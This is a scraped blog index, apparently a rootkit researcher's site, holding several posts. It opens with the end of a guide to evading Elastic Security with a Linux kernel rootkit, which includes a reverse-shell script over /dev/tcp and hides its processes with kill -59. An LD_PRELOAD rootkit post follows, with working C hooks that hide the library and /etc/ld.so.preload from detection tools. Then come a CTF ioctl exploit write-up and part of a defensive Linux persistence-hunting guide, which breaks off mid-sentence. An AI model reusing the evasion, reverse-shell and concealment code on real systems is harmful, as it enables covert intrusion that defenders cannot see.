2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo 